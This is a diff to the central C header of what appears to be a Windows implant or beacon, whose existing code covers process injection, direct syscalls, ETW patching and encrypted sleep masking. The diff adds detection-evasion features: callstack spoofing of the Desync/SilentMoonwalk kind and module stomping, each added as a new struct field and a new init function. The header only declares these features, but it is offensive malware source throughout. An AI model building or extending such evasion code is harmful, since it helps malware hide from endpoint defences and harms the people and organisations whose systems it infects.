@@ -22,6 +22,20 @@ typedef struct _NT_SYSCALL {
 #endif
 #include "stackstr.h"
 
+// Forward-declare DESYNC_SPOOFER for INSTANCE struct (full definition in evasion/callstack_spoof.h)
+#ifdef INCLUDE_EVASION_CALLSTACK_SPOOF
+#ifdef _WIN64
+#include "evasion/callstack_spoof.h"
+#endif
+#endif
+
+// Forward-declare MODULE_STOMP_CTX for INSTANCE struct
+#ifdef INCLUDE_EVASION_MODULE_STOMP
+#ifdef _WIN64
+#include "evasion/module_stomp.h"
+#endif
+#endif
+
 #define DLL_BEACON_START     0x04
 #define ES_VERSION           0x041300
 
@@ -114,6 +128,7 @@ typedef BOOL   (WINAPI *fnCreateDirectoryA)(LPCSTR, LPSECURITY_ATTRIBUTES);
 typedef BOOL   (WINAPI *fnRemoveDirectoryA)(LPCSTR);
 typedef DWORD  (WINAPI *fnGetFileSize)(HANDLE, LPDWORD);
 typedef DWORD  (WINAPI *fnGetFileAttributesA)(LPCSTR);
+typedef DWORD  (WINAPI *fnGetFileAttributesW)(LPCWSTR);
 
 // Injection API types
 typedef LPVOID   (WINAPI *fnVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
@@ -258,6 +273,7 @@ typedef struct _INSTANCE {
         fnRemoveDirectoryA     RemoveDirectoryA;
         fnGetFileSize          GetFileSize;
         fnGetFileAttributesA   GetFileAttributesA;
+        fnGetFileAttributesW   GetFileAttributesW;
 
         // Snapshot
         fnCreateToolhelp32Snapshot CreateToolhelp32Snapshot;
@@ -414,10 +430,26 @@ typedef struct _INSTANCE {
     BOOL   bHellsHallInit;                // TRUE if all syscalls resolved successfully
 #endif
 
+#ifdef INCLUDE_EVASION_CALLSTACK_SPOOF
+#ifdef _WIN64
+    // ─── Desync/SilentMoonwalk callstack spoofing ───
+    DESYNC_SPOOFER DesyncSpoofer;         // Spoofer struct (matches ASM layout)
+    BOOL   bCallstackSpoofInit;           // TRUE if spoofer initialized
+    UINT32 dwDesyncRngState;              // xorshift32 PRNG state for frame variation
+#endif
+#endif
+
 #if SLEEP_MASK_TYPE == MASK_EKKO
     // ─── Ekko sleep state ───
     BYTE   EkkoKey[16];                   // RC4 key for SystemFunction032
     BOOL   bEkkoInitialized;              // TRUE after first Ekko call
+#endif
+
+#ifdef INCLUDE_EVASION_MODULE_STOMP
+#ifdef _WIN64
+    // ─── Module stomping state ───
+    MODULE_STOMP_CTX ModuleStomp;
+#endif
 #endif
 
 } INSTANCE, *PINSTANCE;
@@ -454,6 +486,12 @@ VOID patch_etw(PINSTANCE inst);
 #ifdef INCLUDE_EVASION_HELLSHALL
 BOOL hellshall_init(PINSTANCE inst);
 #endif
+#ifdef INCLUDE_EVASION_CALLSTACK_SPOOF
+BOOL callstack_spoof_init(PINSTANCE inst);
+#endif
+#ifdef INCLUDE_EVASION_MODULE_STOMP
+BOOL module_stomp_init(PINSTANCE inst);
+#endif
 
 // Config parsing
 VOID parse_config(PINSTANCE inst, const BYTE* buf, DWORD len);
@@ -478,7 +516,7 @@ VOID es_dbg_trace(PINSTANCE inst, const char* msg);
 #endif
 
 #ifdef DEBUG
-#define DBG(inst, tag) do { if ((inst)->Win32.OutputDebugStringA) { (inst)->Win32.OutputDebugStringA(tag); (inst)->Win32.OutputDebugStringA("\n"); } } while(0)
+#define DBG(inst, tag) do { if ((inst)->Win32.OutputDebugStringA) { (inst)->Win32.OutputDebugStringA(tag); (inst)->Win32.OutputDebugStringA("\n"); } es_dbg_trace((inst), (tag)); } while(0)
 #else
 #define DBG(inst, tag) ((void)0)
 #endif
